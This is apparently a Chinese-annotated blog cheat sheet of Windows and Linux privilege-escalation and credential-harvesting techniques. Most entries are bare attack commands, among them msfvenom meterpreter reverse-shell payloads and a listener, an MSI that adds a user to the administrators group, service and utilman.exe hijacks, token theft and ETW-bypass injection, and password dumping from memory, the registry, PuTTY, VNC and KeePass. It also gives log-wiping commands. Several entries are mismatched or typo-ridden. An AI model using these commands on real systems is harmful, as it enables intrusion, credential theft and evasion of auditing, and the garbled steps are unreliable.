+<h3 id="Abusing-Services-via-Registry"><a href="#Abusing-Services-via-Registry" class="headerlink" title="Abusing Services via Registry"></a>Abusing Services via Registry</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<ol>
+<li><code>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t</code></li>
+<li><code>REG_EXPAND_SZ /d c:\temp\x.exe /f</code></li>
+<li><code>sc start regsvc</code></li>
+</ol>
+<h3 id="Abusing-Services-via-Executable-File"><a href="#Abusing-Services-via-Executable-File" class="headerlink" title="Abusing Services via Executable File"></a>Abusing Services via Executable File</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<ol>
+<li><code>copy /y c:\Temp\x.exe &quot;c:\Program Files\File Permissions Service\filepermservice.exe&quot;</code></li>
+<li><code>sc start filepermsvc</code></li>
+</ol>
+<h3 id="Abusing-Services-via-Autorun"><a href="#Abusing-Services-via-Autorun" class="headerlink" title="Abusing Services via Autorun"></a>Abusing Services via Autorun</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<p>In Metasploit (msf &gt; prompt) 类型：<code>use multi/handler</code></p>
+<p>In Metasploit (msf &gt; prompt) 类型：<code>set payload windows/meterpreter/reverse_tcp</code></p>
+<p>In Metasploit (msf &gt; prompt) 类型：<code>set lhost [Kali VM IP Address]</code></p>
+<p>In Metasploit (msf &gt; prompt) 类型：<code>run</code></p>
+<p>打开另一个命令提示符并键入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">program.exe 放在 &#x27;C:\Program Files\Autorun Program&#x27;.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Abusing-Services-via-AlwaysInstallElevated"><a href="#Abusing-Services-via-AlwaysInstallElevated" class="headerlink" title="Abusing Services via AlwaysInstallElevated"></a>Abusing Services via AlwaysInstallElevated</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/exec CMD=&#x27;net localgroup administrators user /add&#x27; -f msi-nouac -o setup.msi</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msiexec /quiet /qn /i C:\Temp\setup.msi</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpUp.exe AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：sharpup链接<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
+<h3 id="Abusing-Services-via-SeCreateToken"><a href="#Abusing-Services-via-SeCreateToken" class="headerlink" title="Abusing Services via SeCreateToken"></a>Abusing Services via SeCreateToken</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!rmpriv</span><br></pre></td></tr></table></figure>
+
+<h3 id="Abusing-Services-via-SeDebug"><a href="#Abusing-Services-via-SeDebug" class="headerlink" title="Abusing Services via SeDebug"></a>Abusing Services via SeDebug</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Conjure-LSASS</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syscall_enable_priv 20</span><br></pre></td></tr></table></figure>
+
+<h3 id="Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate"><a href="#Remote-Process-via-Syscalls-HellsGate-Hal操作系统Gate" class="headerlink" title="Remote Process via Syscalls (HellsGate|Hal操作系统Gate)"></a>Remote Process via Syscalls (HellsGate|Hal操作系统Gate)</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">injectEtwBypass pid</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/boku7/injectEtwBypass">https://github.com/boku7/injectEtwBypass</a></p>
+<h3 id="Escalate-With-DuplicateTokenEx"><a href="#Escalate-With-DuplicateTokenEx" class="headerlink" title="Escalate With DuplicateTokenEx"></a>Escalate With DuplicateTokenEx</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型: Abuse Privilege</p>
+<p>方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrimaryTokenTheft.exe pid</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TokenPlaye.exe –impersonate –pid pid</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：</p>
+<p>primarytokenthenft：<a target="_blank" rel="noopener" href="https://github.com/slyd0g/PrimaryTokenTheft">https://github.com/slyd0g/PrimaryTokenTheft</a></p>
+<p>tokenplaye：<a target="_blank" rel="noopener" href="https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8">https://github.com/S1ckB0y1337/TokenPlayer/releases/tag/v0.8</a></p>
+<h3 id="Abusing-Services-via-SeIncreaseBasePriority"><a href="#Abusing-Services-via-SeIncreaseBasePriority" class="headerlink" title="Abusing Services via SeIncreaseBasePriority"></a>Abusing Services via SeIncreaseBasePriority</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start /realtime SomeCpuIntensiveApp.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：</p>
+<p>找了一圈，只有这儿有相关内容：<a target="_blank" rel="noopener" href="https://github.com/gtworek/Priv2Admin">https://github.com/gtworek/Priv2Admin</a></p>
+<h3 id="Abusing-Services-via-SeManageVolume"><a href="#Abusing-Services-via-SeManageVolume" class="headerlink" title="Abusing Services via SeManageVolume"></a>Abusing Services via SeManageVolume</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只需编译并运行SeManageVolumeAbuse</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/xct/SeManageVolumeAbuse">https://github.com/xct/SeManageVolumeAbuse</a></p>
+<h3 id="Abusing-Services-via-SeRelabel"><a href="#Abusing-Services-via-SeRelabel" class="headerlink" title="Abusing Services via SeRelabel"></a>Abusing Services via SeRelabel</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WRITE_OWNER对资源的访问权限，包括文件和文件夹。</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Run for privilege escalation</span><br></pre></td></tr></table></figure>
+
+<h3 id="Abusing-Services-via-SeRestore"><a href="#Abusing-Services-via-SeRestore" class="headerlink" title="Abusing Services via SeRestore"></a>Abusing Services via SeRestore</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<ol>
+<li><code>启动具有 SeRestore 权限的 PowerShell/ISE</code>.</li>
+<li><code>使用Enable-SeRestorePrivilege 启用权限</code>.</li>
+<li><code>将utilman.exe重命名为utilman.old</code></li>
+<li><code>将cmd.exe重命名为utilman.exe</code></li>
+<li><code>锁定控制台并按Win+U</code></li>
+</ol>
+<h3 id="Abuse-via-SeBackup"><a href="#Abuse-via-SeBackup" class="headerlink" title="Abuse via SeBackup"></a>Abuse via SeBackup</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”</span><br><span class="line">并从弹出菜单中选择“创建转储文件”.</span><br></pre></td></tr></table></figure>
+
+<p>3.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /root/Desktop/iexplore.DMP | grep &quot;Authorization: Basic&quot;</span><br></pre></td></tr></table></figure>
+
+<p>选择复制 Base64 编码字符串</p>
+<p>在命令提示符下键入：<code>echo -ne [Base64 String] | Base64-d</code></p>
+<h3 id="Abusing-via-SeCreatePagefile"><a href="#Abusing-via-SeCreatePagefile" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HIBR2BIN /PLATFORM X64 /MAJOR 6 /MINOR 1 /INPUT hiberfil.sys /OUTPUT uncompressed.bin</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/MagnetForensics/Hibr2Bin">https://github.com/MagnetForensics/Hibr2Bin</a></p>
+<h3 id="Abusing-via-SeSystemEnvironment"><a href="#Abusing-via-SeSystemEnvironment" class="headerlink" title="Abusing via SeSystemEnvironment"></a>Abusing via SeSystemEnvironment</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<p>.<code>load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</code></p>
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrustExec.exe -m exec -c &quot;whoami /priv&quot; -f</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：两个工具都没找到QAQ</p>
+<h3 id="Abusing-via-SeTakeOwnership"><a href="#Abusing-via-SeTakeOwnership" class="headerlink" title="Abusing via SeTakeOwnership"></a>Abusing via SeTakeOwnership</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<ol>
+<li><code>takeown.exe /f &quot;%windir%\system32&quot;</code></li>
+<li><code>icalcs.exe &quot;%windir%\system32&quot; /grant &quot;%username%&quot;:F</code></li>
+<li>将cmd.exe重命名为utilman.exe</li>
+<li>锁定控制台并按Win+U</li>
+</ol>
+<h3 id="Abusing-via-SeTcb"><a href="#Abusing-via-SeTcb" class="headerlink" title="Abusing via SeTcb"></a>Abusing via SeTcb</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PSBits</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrivFu</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -i -s -d cmd.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Abusing-via-SeTrustedCredManAccess"><a href="#Abusing-via-SeTrustedCredManAccess" class="headerlink" title="Abusing via SeTrustedCredManAccess"></a>Abusing via SeTrustedCredManAccess</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.load C:\dev\PrivEditor\x64\Release\PrivEditor.dll</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CredManBOF</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TrustExec.exe -m exec -c &quot;whoami /priv&quot; -f</span><br></pre></td></tr></table></figure>
+
+<h3 id="Abusing-tokens-via-SeAssignPrimaryToken"><a href="#Abusing-tokens-via-SeAssignPrimaryToken" class="headerlink" title="Abusing tokens via SeAssignPrimaryToken"></a>Abusing tokens via SeAssignPrimaryToken</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/decoder-it/juicy_2</span><br><span class="line">https://github.com/antonioCoco/RoguePotato</span><br></pre></td></tr></table></figure>
+
+<h3 id="Abusing-via-SeCreatePagefile-1"><a href="#Abusing-via-SeCreatePagefile-1" class="headerlink" title="Abusing via SeCreatePagefile"></a>Abusing via SeCreatePagefile</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abuse Privilege</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flog -s 10s -n 200</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-module LogCleaner.ps1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：wela链接<a target="_blank" rel="noopener" href="https://github.com/Yamato-Security/WELA">https://github.com/Yamato-Security/WELA</a></p>
+<p>日志伪造工具flog：<a target="_blank" rel="noopener" href="https://github.com/mingrammer/flog">https://github.com/mingrammer/flog</a></p>
+<h3 id="Certificate-Abuse"><a href="#Certificate-Abuse" class="headerlink" title="Certificate Abuse"></a>Certificate Abuse</h3><p>域：Yes</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Abusing Certificate</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ceritify.exe request /ca:dc.domain.local\DC-CA /template:User…</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgy /user:CORP\itadmin /certificate:C:\cert.pfx /password:password</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-Memory"><a href="#Password-Mining-in-Memory" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Linux</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<ol>
+<li><code>ps -ef | grep ftp;</code></li>
+<li><code>gdp -p ftp_id</code></li>
+<li><code>info proc mappings</code></li>
+<li><code>q</code></li>
+<li><code>dump memory /tmp/mem [start] [end]</code></li>
+<li><code>q</code></li>
+<li><code>strings /tmp/mem | grep passw</code></li>
+</ol>
+<h2 id="Password-Mining-in-Memory-1"><a href="#Password-Mining-in-Memory-1" class="headerlink" title="Password Mining in Memory"></a>Password Mining in Memory</h2><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>use auxiliary/server/capture/http_basic</code></p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>set uripath x</code></p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
+<p>2.</p>
+<p>在taskmgr中，右键单击“Image Name”栏中的“iexplore.exe”</p>
+<p>并从弹出菜单中选择“创建转储文件”.</p>
+<p>3.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /root/Desktop/iexplore.DMP | grep &quot;Authorization: Basic&quot;</span><br></pre></td></tr></table></figure>
+
+<p>选择复制 Base64 编码字符串.</p>
+<p>在命令提示符下键入: <code>echo -ne [Base64 String] | base64 -d</code></p>
+<h3 id="Password-Mining-in-Registry"><a href="#Password-Mining-in-Registry" class="headerlink" title="Password Mining in Registry"></a>Password Mining in Registry</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>  1.</p>
+<p>打开命令并输入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” /v DefaultUsername</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li></li>
+</ol>
+<p>在命令提示符下键入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query “HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon” /v DefaultPassword</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li></li>
+</ol>
+<p>请注意输出中的凭据</p>
+<ol>
+<li></li>
+</ol>
+<p>在命令提示符下键入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyUsername</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li></li>
+</ol>
+<p>在命令提示符下键入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42 -v ProxyPassword</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>注意输出中的凭据</li>
+<li></li>
+</ol>
+<p>在命令提示符下键入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li></li>
+</ol>
+<p>在命令提示符下键入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li></li>
+</ol>
+<p>记下加密的密码并输入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\User\Desktop\Tools\vncpwd\vncpwd.exe [Encrypted Password]</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li></li>
+</ol>
+<p>从输出中记下凭据.</p>
+<h3 id="Password-Mining-in-General-Events-via-SeAudit"><a href="#Password-Mining-in-General-Events-via-SeAudit" class="headerlink" title="Password Mining in General Events via SeAudit"></a>Password Mining in General Events via SeAudit</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flog -s 10s -n 200</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-module LogCleaner.ps1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-Security-Events-via-SeSecurity"><a href="#Password-Mining-in-Security-Events-via-SeSecurity" class="headerlink" title="Password Mining in Security Events via SeSecurity"></a>Password Mining in Security Events via SeSecurity</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./WELA.ps1 -LogFile .\Security.evtx -EventIDStatistics</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flog -s 10s -n 200</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wevtutil cl Security</span><br></pre></td></tr></table></figure>
+
+<h3 id="Startup-Applications"><a href="#Startup-Applications" class="headerlink" title="Startup Applications"></a>Startup Applications</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>use multi/handler</code></p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>set payload windows/meterpreter/reverse_tcp</code></p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>set lhost [Kali VM IP Address]</code></p>
+<p>In Metasploit (msf &gt; prompt) 输入: <code>run</code></p>
+<p>打开另一个命令提示符并键入:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe</span><br></pre></td></tr></table></figure>
+
+<p>2.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将 x.exe 放在“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-McAfeeSitelistFiles"><a href="#Password-Mining-in-McAfeeSitelistFiles" class="headerlink" title="Password Mining in McAfeeSitelistFiles"></a>Password Mining in McAfeeSitelistFiles</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpUp.exe McAfeeSitelistFiles</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/SharpUp">https://github.com/GhostPack/SharpUp</a></p>
+<h3 id="Password-Mining-in-CachedGPPPassword"><a href="#Password-Mining-in-CachedGPPPassword" class="headerlink" title="Password Mining in CachedGPPPassword"></a>Password Mining in CachedGPPPassword</h3><p>域名: Y/N</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpUp.exe CachedGPPPassword</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-DomainGPPPassword"><a href="#Password-Mining-in-DomainGPPPassword" class="headerlink" title="Password Mining in DomainGPPPassword"></a>Password Mining in DomainGPPPassword</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpUp.exe domianGPPPassword</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-KeePass"><a href="#Password-Mining-in-KeePass" class="headerlink" title="Password Mining in KeePass"></a>Password Mining in KeePass</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt.exe keepass</span><br></pre></td></tr></table></figure>
+
+<p>Or</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KeeTheft.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>批注：</p>
+<p>seatbelt：<a target="_blank" rel="noopener" href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p>
+<p>KeeTheft未找到</p>
+<h3 id="Password-Mining-in-WindowsVault"><a href="#Password-Mining-in-WindowsVault" class="headerlink" title="Password Mining in WindowsVault"></a>Password Mining in WindowsVault</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt.exe WindowsVault</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Mining-in-SecPackageCreds"><a href="#Password-Mining-in-SecPackageCreds" class="headerlink" title="Password Mining in SecPackageCreds"></a>Password Mining in SecPackageCreds</h3><p>域：No</p>
+<p>Local Admin: Yes</p>
+<p>操作系统: Windows</p>
+<p>类型:  Enumeration &amp; Hunt</p>
+<p>方法:</p>
+<p>1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Seatbelt.exe SecPackageCreds</span><br></pre></td></tr></table></figure>
+
